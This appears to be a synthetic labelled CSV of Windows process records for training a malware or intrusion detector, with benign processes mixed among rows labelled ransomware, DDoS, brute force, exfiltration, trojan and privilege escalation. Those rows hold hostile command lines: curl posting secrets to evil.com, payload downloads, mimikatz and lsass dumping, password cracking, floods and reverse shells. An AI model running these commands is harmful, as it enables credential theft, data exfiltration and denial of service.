process_name,cmdline,cpu_usage,memory_usage,pid,ppid,has_network_activity,connection_count,is_system_user,label
tsc.exe,tsc.exe,2.8812847208653736,3.5237762564991826,36105,5896,0,4,1,normal
lsass.exe,lsass.exe,4.407804998661219,0.3047987853466108,3375,6627,0,4,0,normal
services.exe,services.exe,0.03908166784294198,0.3080150406070249,7818,2900,0,11,0,normal
git.exe,git.exe,33.110174389605156,1.9124235063005528,30679,9157,0,11,1,normal
rclone.exe,rclone.exe copy C:\Confidential remote:exfil,33.456099730307486,19.727123001583294,1683,2128,0,17,0,data_exfiltration
python3.exe,python3.exe,51.28896725444151,24.425196183767188,46721,5349,0,14,1,normal
python.exe,python.exe,90.20707735655343,28.106165913877145,8031,3785,1,5,1,normal
loic.exe,loic.exe --target 192.168.1.1,78.48878519594157,18.112016314568177,13114,1591,1,247,0,ddos
john.exe,john.exe --wordlist=rockyou.txt hashes.txt,81.22711745116209,11.614894305409146,1257,221,1,7,0,brute_force
dwm.exe,dwm.exe,11.126228287384018,2.576096117981236,53178,9848,0,9,0,normal
powershell.exe,powershell.exe,54.687866911204814,4.223316014519947,51740,6983,0,5,1,normal
curl.exe,curl.exe -X POST -d @secrets.txt http://evil.com,11.875451595271414,24.793879875511152,58872,8359,1,6,0,data_exfiltration
mimikatz.exe,mimikatz.exe sekurlsa::logonpasswords,47.558506194490974,19.471133462449433,8374,6541,1,4,0,malware
firefox.exe,firefox.exe,18.870331547348677,12.073096818778206,62658,3268,0,8,1,normal
hashcat.exe,hashcat.exe -m 1000 hash.txt wordlist.txt,90.36001561459139,10.888469593536563,17714,1664,1,4,0,brute_force
firefox.exe,firefox.exe,37.411162733676,15.135671775829275,34703,161,0,4,0,normal
medusa.exe,medusa.exe -h 10.0.0.1 -u admin -P passwords.txt,50.22945948171104,5.707713531559259,52089,9352,1,2,0,brute_force
powershell.exe,powershell.exe,15.001511510725576,8.132033507177043,51906,6864,0,2,0,normal
docker.exe,docker.exe,26.424509473822948,4.352251623427782,3406,9435,0,4,0,normal
Teams.exe,Teams.exe,22.256644012306758,12.790897277326236,54411,3219,0,4,0,normal
bash.exe,bash.exe,26.17362910390468,2.7287173192829433,10106,3589,1,2,0,normal
git.exe,git.exe,31.038573033977613,1.9731990718540469,36634,8536,0,12,0,normal
loic.exe,loic.exe --target 192.168.1.1,89.12258168613775,17.64878758020665,58416,9504,1,1511,0,ddos
Slack.exe,Slack.exe,20.52677998392812,7.384619625297057,14314,8463,0,12,0,normal
chrome_update.exe,chrome_update.exe --no-ui,12.591998834180892,5.056259440739267,37773,4013,0,8,0,trojan
dwm.exe,dwm.exe,12.410656092232989,9.118223476309105,30753,5623,0,8,0,normal
hping.exe,hping.exe --flood -p 80 target.com,98.98478936641527,28.465557160638955,57700,5320,1,1806,0,ddos
explorer.exe,explorer.exe,7.5341269218356635,2.0779043069474565,36225,9109,0,10,0,normal
msedge.exe,msedge.exe,27.47196436624651,5.777825277080436,22310,6388,0,7,0,normal
cmd.exe,cmd.exe,13.933078356892379,1.0309414788969966,26162,9469,0,8,0,normal
chrome_update.exe,chrome_update.exe --no-ui,31.526161737977656,9.877020043859186,20744,3425,1,11,0,trojan
encrypt.exe,encrypt.exe --recursive C:\Users,74.6963699141335,15.995616952912075,27710,1271,0,10,0,ransomware
locker.exe,locker.exe --wallet bc1qxy...,51.62168626116716,25.518352012544007,57490,5376,0,1,0,ransomware
loic.exe,loic.exe --target 192.168.1.1,71.35504758847932,24.704542496687612,63266,3489,1,342,0,ddos
services.exe,services.exe,0.36063871512999435,0.2804422173858565,41902,5370,0,10,0,normal
System Idle Process,System Idle Process,93.63765126085599,0.05376928100886519,46456,5845,1,7,0,normal
locker.exe,locker.exe --wallet bc1qxy...,51.42206771542153,12.032363509394502,4196,4669,1,11,0,ransomware
System,System,0.07966424928056215,0.06951626215669204,37543,39,1,5,1,normal
node.exe,node.exe,99.71285113760837,13.3062056963158,11479,9184,0,8,0,normal
WindowsTerminal.exe,WindowsTerminal.exe,22.94499747096788,4.52150281458327,22244,795,0,1,1,normal
System Idle Process,System Idle Process,97.23241158366822,0.020235976504889487,38994,5424,0,9,0,normal
backdoor.exe,backdoor.exe --persist,16.80952117077186,24.792968633693064,55003,6028,1,15,0,malware
ransom.exe,ransom.exe --encrypt --payment,81.47687447742365,9.240016317662645,51412,8069,1,15,0,ransomware
hydra.exe,hydra.exe -l admin -P wordlist.txt ssh://target,60.72819635093035,19.49021668318138,44271,9302,1,474,0,brute_force
webpack.exe,webpack.exe,34.77092197776215,13.049069415269907,53697,1964,0,4,1,normal
update.exe,update.exe --silent --download http://evil.com/payload,12.21973639199979,18.405939368202855,49468,9458,1,19,0,trojan
firefox.exe,firefox.exe,11.604777916376957,23.159008604440444,61165,7522,0,11,0,normal
chrome_update.exe,chrome_update.exe --no-ui,20.785833362596094,9.406404229565315,31469,9983,0,10,0,trojan
printspoofer.exe,printspoofer.exe -i -c cmd,21.53146026917906,14.04627614164979,29752,8500,0,17,0,privilege_escalation
msedge.exe,msedge.exe,44.655633790531745,13.23808211461208,21112,6023,1,3,0,normal
printspoofer.exe,printspoofer.exe -i -c cmd,27.363114268665466,10.897444327991959,396,2749,0,18,0,privilege_escalation
SearchIndexer.exe,SearchIndexer.exe,19.98210102215133,3.454230881328418,43139,9905,0,1,0,normal
WindowsTerminal.exe,WindowsTerminal.exe,13.230753039202552,9.886496285573207,54322,345,0,9,0,normal
locker.exe,locker.exe --wallet bc1qxy...,67.42983802433703,8.877428916662435,63401,5594,0,5,0,ransomware
System Idle Process,System Idle Process,84.37892803754389,0.06261890852679806,23681,944,0,10,0,normal
hping.exe,hping.exe --flood -p 80 target.com,87.53210295279014,8.31617186447312,49403,1586,1,3441,0,ddos
python3.exe,python3.exe,2.712598888441753,19.755821718060453,33971,9922,0,2,0,normal
rclone.exe,rclone.exe copy C:\Confidential remote:exfil,42.847886181187796,26.110912848285636,18654,8227,0,18,0,data_exfiltration
explorer.exe,explorer.exe,8.939378462018377,1.2619574419851807,46390,3748,1,8,0,normal
scvhost.exe,scvhost.exe,30.187650819080044,22.6260348189538,43928,147,1,4,0,malware
chrome.exe,chrome.exe,15.10534406481299,16.847136362851042,19864,7261,1,9,0,normal
System Idle Process,System Idle Process,98.447537201606,0.02412285604973723,1202,6939,0,14,0,normal
git.exe,git.exe,17.108759513542655,1.6295774271602617,11604,3283,0,0,0,normal
git.exe,git.exe,46.8485995271827,2.462686537471834,2141,8173,1,8,1,normal
System Idle Process,System Idle Process,90.71221013092645,0.06763520816282813,32817,5869,0,5,0,normal
devenv.exe,devenv.exe,51.53411189766904,9.560777537900575,10092,3012,0,4,1,normal
helper.exe,helper.exe --reverse-shell 10.0.0.1:4444,15.477423336695157,26.687285609616787,27158,951,0,11,0,trojan
wsl.exe,wsl.exe,13.454588919625564,8.263352482045587,13669,5908,0,15,0,normal
juicypotato.exe,juicypotato.exe -l 1337 -p cmd.exe,44.65558111395495,5.221630975724901,999,2774,1,19,0,privilege_escalation
WindowsTerminal.exe,WindowsTerminal.exe,14.019818260543323,1.0424959980868787,57802,1549,0,8,1,normal
encrypt.exe,encrypt.exe --recursive C:\Users,81.24611929863617,12.41763605877687,23869,8864,1,6,0,ransomware
hashcat.exe,hashcat.exe -m 1000 hash.txt wordlist.txt,92.97821503998402,16.545020081045127,37067,3948,1,11,0,brute_force
chrome.exe,chrome.exe,59.93315010417946,2.2439300375857054,56620,267,0,15,1,normal
tsc.exe,tsc.exe,87.62041089393757,8.380388597187306,5529,2348,0,14,0,normal
csrss.exe,csrss.exe,0.31562680822949285,0.2363616938769129,27724,290,0,3,0,normal
devenv.exe,devenv.exe,56.407668305542174,21.77647877553603,6111,6044,1,14,0,normal
svchost.exe,svchost.exe,7.784370820896179,1.640517517010978,30357,1583,0,9,0,normal
docker.exe,docker.exe,40.749236627946594,7.602789051161481,19838,140,0,9,0,normal
Discord.exe,Discord.exe,11.381543399015584,12.381509413643819,25822,2821,0,11,0,normal
explorer.exe,explorer.exe,7.307874197231106,2.402485722478961,25983,1756,0,9,1,normal
cryptor.exe,cryptor.exe -aes256 -all,86.42468211375018,12.994053565661098,1192,8848,0,7,0,ransomware
lsass.exe,lsass.exe,4.3561892558127076,1.1418806071798044,21228,125,0,9,0,normal
powershell.exe,powershell.exe -encodedcommand JABjAGwAaQBlAG4AdAA=,41.32799828318992,19.683422521482896,63411,5830,1,9,0,privilege_escalation
dwm.exe,dwm.exe,24.547605059088866,1.9591059052397275,8092,8880,0,1,0,normal
firefox.exe,firefox.exe,43.429785496367174,20.52321580202496,7030,1609,1,14,1,normal
hashcat.exe,hashcat.exe -m 1000 hash.txt wordlist.txt,93.13602392809801,26.077439746915402,14501,5361,0,6,0,brute_force
node.exe,node.exe,73.34109572816487,8.73600142321205,47125,6988,0,8,0,normal
powershell.exe,powershell.exe -encodedcommand JABjAGwAaQBlAG4AdAA=,54.2721625560109,26.844597162183714,64316,6537,0,12,0,privilege_escalation
wsl.exe,wsl.exe,6.668057319142578,5.715685785509848,21806,5932,0,1,1,normal
python3.exe,python3.exe,47.58463185793621,2.465458833590762,29962,3060,0,5,1,normal
MSBuild.exe,MSBuild.exe,8.47039276108138,15.29772864227875,23925,6506,0,13,0,normal
payload.exe,payload.exe --silent,20.70011662568764,24.019964361998337,31056,5343,0,15,0,malware
svchost.exe,svchost.exe,1.0848644305952415,2.6680659781270517,873,4263,0,5,0,normal
wsl.exe,wsl.exe,13.62057149468665,5.526082851132599,1253,3874,0,1,0,normal
cmd.exe,cmd.exe,28.840467223446964,0.9632948593831311,9300,9374,0,6,0,normal
Code.exe,Code.exe,30.49506613975818,7.933172118917128,28269,9771,0,11,0,normal
node.exe,node.exe,86.14918266541896,1.0546795936668607,35328,2226,0,8,0,normal
wsl.exe,wsl.exe,36.578428736105586,6.648841270342588,33433,4042,1,12,0,normal
backdoor.exe,backdoor.exe --persist,25.585303191675766,15.658025519341669,10879,8045,1,4,0,malware
MSBuild.exe,MSBuild.exe,20.487496069403612,15.090764514976454,17853,2385,0,12,0,normal
MSBuild.exe,MSBuild.exe,78.7317282069537,9.20671992083714,28719,6880,0,14,0,normal
python3.exe,python3.exe,21.572739925468966,1.8975421201875224,25638,4740,1,9,1,normal
medusa.exe,medusa.exe -h 10.0.0.1 -u admin -P passwords.txt,52.490444105551525,25.582916379602644,44931,3911,1,2,0,brute_force
SearchIndexer.exe,SearchIndexer.exe,23.0520218244995,2.8635554168997697,58816,6264,0,6,1,normal
Docker Desktop.exe,Docker Desktop.exe,34.89494962000835,11.415565104276672,8767,1930,0,9,0,normal
john.exe,john.exe --wordlist=rockyou.txt hashes.txt,88.6003888782608,20.0787954438865,44945,5405,0,12,0,brute_force
Discord.exe,Discord.exe,10.484161182380697,13.307071109435022,6786,1778,0,8,1,normal
john.exe,john.exe --wordlist=rockyou.txt hashes.txt,85.96765814415946,22.26038556626259,39748,3499,0,6,0,brute_force
rclone.exe,rclone.exe copy C:\Confidential remote:exfil,26.85352178467566,25.154220807333573,52799,4765,0,5,0,data_exfiltration
git.exe,git.exe,24.79703871661181,4.328069267703471,22943,4033,0,4,1,normal
bash.exe,bash.exe,32.88918876114253,4.972099799320319,43487,2490,0,10,0,normal
chrome.exe,chrome.exe,54.774421097032224,22.97587022698886,14218,8826,0,3,1,normal
Docker Desktop.exe,Docker Desktop.exe,14.888118696712516,10.220108362003014,11962,6301,0,15,1,normal
msedge.exe,msedge.exe,20.70550979166287,18.821124189913768,23902,3860,1,6,1,normal
explorer.exe,explorer.exe,3.2637947982346436,1.8971170143727183,7807,5345,0,15,0,normal
ftp.exe,ftp.exe -s:script.txt evil-server.com,19.150553760262127,8.92368050194517,44379,4712,1,2,0,data_exfiltration
backdoor.exe,backdoor.exe --persist,28.87898612357571,6.050831507512164,64905,7027,0,14,0,malware
tsc.exe,tsc.exe,23.198633549061654,10.227051017500811,3034,2932,0,12,0,normal
npm.exe,npm.exe,11.199785741375411,3.7048474862763454,36948,5059,0,2,1,normal
python3.exe,python3.exe,40.24709684458381,19.758715628417928,8159,2565,0,12,0,normal
python3.exe,python3.exe,7.6260345800836955,22.48313662183548,17133,8319,1,7,1,normal
explorer.exe,explorer.exe,9.739416097617472,1.6187808565176947,28206,9185,1,5,1,normal
tsc.exe,tsc.exe,10.713941860937105,4.297150266420563,25836,9193,0,10,0,normal
webpack.exe,webpack.exe,51.56886406712439,4.856108678074511,42309,1967,1,6,0,normal
System,System,2.2402067846690383,0.09235066407011816,53641,5846,0,13,1,normal
hping.exe,hping.exe --flood -p 80 target.com,88.95592756648469,13.04538782293854,50053,9824,1,1502,0,ddos
System,System,1.520460490685147,0.09385340520276947,2079,316,0,9,1,normal
locker.exe,locker.exe --wallet bc1qxy...,78.09347101124011,25.082386956717265,9656,1157,0,4,0,ransomware
Discord.exe,Discord.exe,21.646503626120325,13.039819567576945,64162,888,1,5,0,normal
hashcat.exe,hashcat.exe -m 1000 hash.txt wordlist.txt,97.04110231470403,25.70143841275986,16179,233,1,3,0,brute_force
Teams.exe,Teams.exe,28.428208282210374,19.144095434616293,9195,4891,1,9,0,normal
bash.exe,bash.exe,24.264297943787206,1.7544862354514277,50464,3572,1,9,0,normal
svchost.exe,svchost.exe,9.37853509549766,0.9520718562797872,42999,2616,0,5,0,normal
helper.exe,helper.exe --reverse-shell 10.0.0.1:4444,14.822001487713667,8.651523179004299,35853,679,0,16,0,trojan
docker.exe,docker.exe,1.9239245086477674,8.043709959576969,8564,4404,0,6,0,normal
MSBuild.exe,MSBuild.exe,57.50756138930434,10.09619874749354,53679,8117,0,13,0,normal
Docker Desktop.exe,Docker Desktop.exe,24.345297558701184,11.570191465448074,2315,9744,1,11,0,normal
firefox.exe,firefox.exe,13.792629522584527,3.8996525140549823,29938,1263,0,5,1,normal
Code.exe,Code.exe,31.759681887116464,17.957335390301388,57328,3895,0,14,1,normal
OUTLOOK.EXE,OUTLOOK.EXE,9.999762676666183,3.1780994638489712,20503,9651,1,9,1,normal
mimikatz.exe,mimikatz.exe sekurlsa::logonpasswords,33.418549346826744,22.26158507319498,27705,3855,1,2,0,malware
WindowsTerminal.exe,WindowsTerminal.exe,6.344790597342342,1.213601814507352,34305,5005,0,14,1,normal
juicypotato.exe,juicypotato.exe -l 1337 -p cmd.exe,33.410888451132266,14.169970349861806,50917,5092,0,3,0,privilege_escalation
Docker Desktop.exe,Docker Desktop.exe,16.26888162285074,4.26863909826897,46372,6779,1,15,0,normal
MSBuild.exe,MSBuild.exe,32.73388075839401,8.678902068149318,62169,648,0,4,1,normal
devenv.exe,devenv.exe,21.854143400332013,14.549816300902766,43474,975,1,10,0,normal
python3.exe,python3.exe,82.93530054309221,3.017879592074001,62638,9722,0,10,1,normal
java.exe,java.exe,62.098044497037094,9.536460556035006,43624,5070,0,4,1,normal
backdoor.exe,backdoor.exe --persist,28.94954302681934,19.882273609828957,731,9661,0,18,0,malware
devenv.exe,devenv.exe,46.40700494855488,18.81245275357699,51959,3999,0,12,0,normal
svchost.exe,svchost.exe,8.024656658116585,0.37533262623030506,2794,7464,1,6,1,normal
hashcat.exe,hashcat.exe -m 1000 hash.txt wordlist.txt,92.35898800273085,23.20907069982975,23827,1882,0,16,0,brute_force
System Idle Process,System Idle Process,92.43236692032512,0.08656522940463025,18323,7574,0,1,0,normal
python.exe,python.exe,89.10489328718593,27.262377407398613,57971,4270,0,2,0,normal
powershell.exe,powershell.exe,18.468524231981103,2.0221175072928164,7222,5885,1,6,0,normal
scvhost.exe,scvhost.exe,25.086118372313912,12.416023836095096,46232,6685,0,16,0,malware
mimikatz.exe,mimikatz.exe lsadump::sam,28.453535577756732,14.114871251592884,49818,4101,1,7,0,malware
git.exe,git.exe,30.235394557134576,2.498029303375882,19496,6448,0,11,0,normal
python3.exe,python3.exe,56.03646056959286,1.166548332017227,49047,1824,0,2,1,normal
firefox.exe,firefox.exe,18.861504075052785,16.27027865965641,61590,1018,0,4,0,normal
java.exe,java.exe,72.34436431111416,29.802664289264033,40939,1116,0,12,1,normal
update.exe,update.exe --silent --download http://evil.com/payload,39.79840981758332,18.11651976180827,32158,8501,0,5,0,trojan
Code.exe,Code.exe,38.39669776945677,14.557894856332696,62997,7014,1,13,0,normal
chrome.exe,chrome.exe,11.606698792560302,2.2218493724800834,35203,214,0,15,1,normal
SearchIndexer.exe,SearchIndexer.exe,0.05508176992355285,4.527902699638057,15711,245,0,6,0,normal
ransom.exe,ransom.exe --encrypt --payment,89.4795236286895,16.572845089241646,667,3355,1,0,0,ransomware
docker.exe,docker.exe,2.7027809753391088,3.4846380624144526,17582,5647,0,5,0,normal
Slack.exe,Slack.exe,14.768265999075512,9.256705291116473,57548,2760,0,10,1,normal
explorer.exe,explorer.exe,0.5498961254971391,4.392934423179685,39591,3922,0,10,1,normal
Code.exe,Code.exe,49.06637580911417,17.595288386400412,52614,9433,0,10,1,normal
chrome.exe,chrome.exe,55.68590804752768,26.315793819660357,28590,6362,0,3,1,normal
lsass.exe,lsass.exe,4.677811767984435,0.8991204812918704,2876,8340,0,8,0,normal
Slack.exe,Slack.exe,5.133550752141206,8.971708331009072,45783,8309,0,11,1,normal
node.exe,node.exe,88.45708239347316,9.31952957541165,63525,3961,1,9,0,normal
webpack.exe,webpack.exe,17.29389608690859,10.242612107182268,18582,3621,1,2,1,normal
Docker Desktop.exe,Docker Desktop.exe,12.8228256997769,10.236615975227217,5332,7418,1,1,1,normal
chrome_update.exe,chrome_update.exe --no-ui,26.463122665013103,11.919765088867328,37865,1673,1,17,0,trojan
docker.exe,docker.exe,37.398193594602816,2.751568630209893,3413,5133,0,11,0,normal
svchost.exe,svchost.exe,10.049163016254418,2.959967349257,26762,3794,0,9,0,normal
Code.exe,Code.exe,44.62038001562533,11.694211002731059,59199,415,0,11,1,normal
Teams.exe,Teams.exe,32.71959448627787,15.903822945219256,4094,239,0,13,1,normal
services.exe,services.exe,0.42069824329910754,0.27518219006722494,47113,1660,0,9,1,normal
services.exe,services.exe,1.6450764552574255,0.9132574440711977,12819,7103,1,15,1,normal
MsMpEng.exe,MsMpEng.exe,19.715326951539076,3.9804199034102563,52474,4236,1,6,1,normal
procdump.exe,procdump.exe -ma lsass.exe lsass.dmp,40.64651579596311,6.824918804642889,41997,5807,0,2,0,privilege_escalation
services.exe,services.exe,0.11590154182580714,0.22359869887809497,26457,2862,0,14,1,normal
explorer.exe,explorer.exe,7.403392376872013,4.332723444968112,6779,550,1,9,1,normal
medusa.exe,medusa.exe -h 10.0.0.1 -u admin -P passwords.txt,57.468757190574934,8.161061178880239,58766,7505,1,16,0,brute_force
MSBuild.exe,MSBuild.exe,12.079872739864705,13.460843807638858,55531,7839,1,5,0,normal
MsMpEng.exe,MsMpEng.exe,69.39270123535736,4.893401845028952,26517,4388,0,15,0,normal
Code.exe,Code.exe,49.9588369801942,16.399643925339145,60009,8666,1,12,0,normal
loic.exe,loic.exe --target 192.168.1.1,71.51614946791327,26.782313911177525,45006,1854,1,662,0,ddos
Docker Desktop.exe,Docker Desktop.exe,4.481218712889388,9.927321647473171,20173,8678,0,12,0,normal
SearchIndexer.exe,SearchIndexer.exe,25.355133389107596,4.503346321245935,22169,378,1,3,1,normal
powershell.exe,powershell.exe -encodedcommand JABjAGwAaQBlAG4AdAA=,32.26178876037327,9.208605093310648,16830,8295,0,9,0,privilege_escalation
explorer.exe,explorer.exe,6.594777722985321,1.8850999555726657,13485,4853,0,6,1,normal
java.exe,java.exe,84.28841497557094,19.57261522466665,13230,4853,0,15,0,normal
WindowsTerminal.exe,WindowsTerminal.exe,24.729172841616023,5.674755955038386,39180,3569,0,6,0,normal
csrss.exe,csrss.exe,0.19712701034563807,0.14465985915441992,48861,4697,0,0,0,normal
hping.exe,hping.exe --flood -p 80 target.com,91.01006034166251,18.01498049407403,23354,9104,1,529,0,ddos
Discord.exe,Discord.exe,6.859141698236873,10.938029806088286,20178,3676,0,5,0,normal
encrypt.exe,encrypt.exe --recursive C:\Users,90.85031676963764,14.772431279175878,42433,3421,1,6,0,ransomware
SearchIndexer.exe,SearchIndexer.exe,14.959250454338239,4.605354194804763,8257,4477,0,15,0,normal
chrome_update.exe,chrome_update.exe --no-ui,26.84895422844686,24.90739700424793,7041,3928,1,19,0,trojan
chrome_update.exe,chrome_update.exe --no-ui,10.286435782141888,28.321745225197773,31739,9395,0,18,0,trojan
npm.exe,npm.exe,52.71444159790089,7.742778768955262,54129,6809,0,13,0,normal
tsc.exe,tsc.exe,11.562700698275973,6.2184744623773165,8559,1447,0,0,0,normal
MSBuild.exe,MSBuild.exe,63.63161922764174,17.41561751456598,52492,9981,0,4,0,normal
explorer.exe,explorer.exe,9.365276956032393,3.934423021788211,53912,5429,0,15,0,normal
OUTLOOK.EXE,OUTLOOK.EXE,24.22481433066876,3.073323260863992,42172,1336,0,3,1,normal
cmd.exe,cmd.exe,8.722932231904087,2.795748128143429,17748,528,0,8,0,normal
npm.exe,npm.exe,61.84979732167966,15.097356969118042,36163,332,0,1,0,normal
docker.exe,docker.exe,21.92502790914376,6.209424527034705,7753,1550,0,10,1,normal
csrss.exe,csrss.exe,1.354756581015962,0.31457698496996495,3794,9656,0,8,1,normal
ransom.exe,ransom.exe --encrypt --payment,81.74626955019585,28.509050085141613,59013,2711,1,8,0,ransomware
hping.exe,hping.exe --flood -p 80 target.com,91.55585650099033,22.648075084545628,1836,8951,1,2366,0,ddos
OUTLOOK.EXE,OUTLOOK.EXE,24.690927323270994,11.199744294935236,36768,8707,1,3,0,normal
rclone.exe,rclone.exe copy C:\Confidential remote:exfil,49.44679090827662,19.615628437485913,54814,9028,1,3,0,data_exfiltration
firefox.exe,firefox.exe,47.7938763218432,6.189348236714548,64626,7785,1,10,1,normal
payload.exe,payload.exe --silent,46.46336392528357,11.934878440289786,29021,9687,0,12,0,malware
python.exe,python.exe,88.52791449599592,4.55485373205958,46228,4171,1,3,0,normal
helper.exe,helper.exe --reverse-shell 10.0.0.1:4444,9.481274163207203,10.82226846434651,41605,1352,0,17,0,trojan
helper.exe,helper.exe --reverse-shell 10.0.0.1:4444,19.205258659090795,6.302379040421736,13750,3409,0,17,0,trojan
Code.exe,Code.exe,16.764279810231344,16.25169075716918,62644,2527,0,12,0,normal
OUTLOOK.EXE,OUTLOOK.EXE,19.13647805607259,13.107481918514269,60111,8405,0,8,0,normal
curl.exe,curl.exe -X POST -d @secrets.txt http://evil.com,17.719465419692646,26.569566790475534,30821,5148,1,20,0,data_exfiltration
stress.exe,stress.exe --cpu 16 --flood,94.39187322611221,18.497095988543258,52552,332,1,861,0,ddos
MsMpEng.exe,MsMpEng.exe,57.40745732631251,9.146057496968151,46540,5644,0,13,1,normal
System,System,1.0423124731548195,0.28746918212812345,7411,8236,0,7,0,normal
MSBuild.exe,MSBuild.exe,96.11817707421343,3.1344764591632313,49825,1413,0,3,0,normal
csrss.exe,csrss.exe,0.8381881726450275,0.6529072900654861,32672,4375,0,11,1,normal
firefox.exe,firefox.exe,30.231351375375638,3.6296579983867017,58482,5057,0,13,0,normal
Slack.exe,Slack.exe,3.3613221373509443,11.32221101414014,11920,7951,0,13,1,normal
services.exe,services.exe,0.7140239101091705,0.6496486572208455,33404,6387,0,2,0,normal
Code.exe,Code.exe,35.1174729322365,9.806775424612185,18174,1926,0,1,0,normal
python.exe,python.exe,98.2602125161787,4.5546866958706325,32811,6306,1,14,0,normal
printspoofer.exe,printspoofer.exe -i -c cmd,26.182135986875984,24.86338477822463,21718,7904,0,1,0,privilege_escalation
docker.exe,docker.exe,7.366752808691918,2.2675480096831695,19278,4632,0,4,0,normal
Slack.exe,Slack.exe,13.0793343377685,3.024544074419224,30595,3467,0,3,0,normal
Discord.exe,Discord.exe,20.60861994755325,8.661925937284773,38183,4544,0,5,0,normal
git.exe,git.exe,26.943381100236905,4.972203670992767,52363,4917,1,15,0,normal
hydra.exe,hydra.exe -l admin -P wordlist.txt ssh://target,69.53160082962319,5.425076973255479,31946,4164,1,435,0,brute_force
MSBuild.exe,MSBuild.exe,50.77876638995591,14.56968871867411,10951,5924,0,13,1,normal
locker.exe,locker.exe --wallet bc1qxy...,66.68661357425502,19.560806255552578,26303,8891,0,6,0,ransomware
node.exe,node.exe,57.01063863690307,4.139580551520896,18998,9311,0,7,0,normal
webpack.exe,webpack.exe,39.54788863564321,16.274877245692274,28112,3946,0,11,0,normal
java.exe,java.exe,87.24148214344247,15.65351483315956,31424,9102,0,11,1,normal
MSBuild.exe,MSBuild.exe,22.871595834826643,5.36501824969975,41020,7672,0,10,0,normal
svchosts.exe,svchosts.exe -connect evil.com,13.170383794390176,16.562895715598927,18606,4166,0,20,0,malware
svchosts.exe,svchosts.exe -connect evil.com,23.60718312459355,17.582038977924533,31414,7319,0,14,0,malware
npm.exe,npm.exe,81.88910971393697,14.841994727147283,21878,3524,0,8,0,normal
MSBuild.exe,MSBuild.exe,85.55033558324247,4.409757557003195,39808,8955,0,1,0,normal
Teams.exe,Teams.exe,22.206035988490182,3.0224571849838737,883,1086,0,14,0,normal
msedge.exe,msedge.exe,22.292193198297483,16.581246083499344,59648,1693,1,11,1,normal
python.exe,python.exe,95.72828819354984,2.9864978074686253,42473,3803,0,15,0,normal
loic.exe,loic.exe --target 192.168.1.1,76.62183309376739,29.16504698863888,39467,5193,1,1352,0,ddos
python.exe,python.exe,73.3338994985462,20.32629401784139,56412,2479,0,7,1,normal
dwm.exe,dwm.exe,2.1615523564903647,3.2330705036268244,26241,430,0,15,0,normal
helper.exe,helper.exe --reverse-shell 10.0.0.1:4444,11.669987033424484,28.753357470381655,48497,9777,0,20,0,trojan
wsl.exe,wsl.exe,44.218975125471225,5.54250262480602,57942,4964,1,1,1,normal
System Idle Process,System Idle Process,93.92198490816912,0.03729179679069986,29739,587,0,13,1,normal
chrome.exe,chrome.exe,43.540309135867126,22.548361405493424,53155,8143,0,13,1,normal
webpack.exe,webpack.exe,4.663430074388641,13.451363830459423,53839,1064,1,0,1,normal
bash.exe,bash.exe,38.270104289119374,1.1537118670608928,49334,6002,0,8,0,normal
Slack.exe,Slack.exe,13.152915015650041,13.427320990237984,29980,3237,0,15,0,normal
powershell.exe,powershell.exe,59.045410309273564,4.299044834665118,11794,5123,1,3,1,normal
rclone.exe,rclone.exe copy C:\Confidential remote:exfil,40.460799081033784,17.608715376989984,20814,6381,0,10,0,data_exfiltration
curl.exe,curl.exe -X POST -d @secrets.txt http://evil.com,12.367839835982355,28.470274506629956,50232,2820,0,5,0,data_exfiltration
MSBuild.exe,MSBuild.exe,49.82654037731198,13.78821994626075,64972,9695,0,0,0,normal
powershell.exe,powershell.exe,43.070319738460256,5.6724367474668895,43709,6488,1,11,0,normal
procdump.exe,procdump.exe -ma lsass.exe lsass.dmp,41.824931369097314,27.210811729967546,39338,6484,1,17,0,privilege_escalation
python.exe,python.exe,28.899487740112907,4.98950932112702,26382,8423,0,5,0,normal
System Idle Process,System Idle Process,88.993247850355,0.026717289012520698,58915,5015,0,9,0,normal
python3.exe,python3.exe,73.94146789888187,19.062862940421425,64876,7513,0,8,0,normal
curl.exe,curl.exe -X POST -d @secrets.txt http://evil.com,18.21349897081167,14.924942832517317,8947,4905,1,5,0,data_exfiltration
backdoor.exe,backdoor.exe --persist,11.786079717910745,5.423917867934581,40109,9807,1,4,0,malware
firefox.exe,firefox.exe,44.768353944661996,24.67338343905824,46928,4176,1,14,0,normal
tsc.exe,tsc.exe,0.5364056908718995,5.297353749809066,61061,4954,0,3,0,normal
chrome.exe,chrome.exe,24.27341394790055,8.567122408024048,19861,613,0,12,1,normal
devenv.exe,devenv.exe,14.233199366840834,11.514430087069854,60020,4173,0,6,1,normal
csrss.exe,csrss.exe,0.3650340896054869,0.38557447478995877,28490,7498,0,5,0,normal
